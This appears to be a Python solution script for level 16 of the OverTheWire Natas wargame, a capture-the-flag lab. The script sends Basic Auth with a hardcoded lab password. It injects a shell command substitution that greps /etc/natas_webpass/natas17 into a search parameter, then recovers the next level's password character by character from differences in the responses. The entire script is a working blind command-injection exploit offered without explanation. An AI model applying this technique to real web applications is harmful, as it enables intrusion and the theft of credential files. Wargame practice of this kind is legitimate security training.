#!/usr/local/bin/python3
mystring = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN0123456789"
import http.client, urllib
from base64 import b64encode

BasicAuth = b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("utf-8")
header={"Authorization": "Basic %s" % BasicAuth,"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}

connect=http.client.HTTPConnection("natas16.natas.labs.overthewire.org")
pw=""
while len(pw)!=32:
	for p in mystring:
		params= urllib.parse.urlencode({"needle":"$(grep -E ^"+pw+p+".* /etc/natas_webpass/natas17)darkening","submit":"Search"})
		connect.request("GET","/index.php?"+params,"",header)
		res=connect.getresponse()
		if "darkening" not in str(res.read()):
			pw+=p
			print(pw)
			continue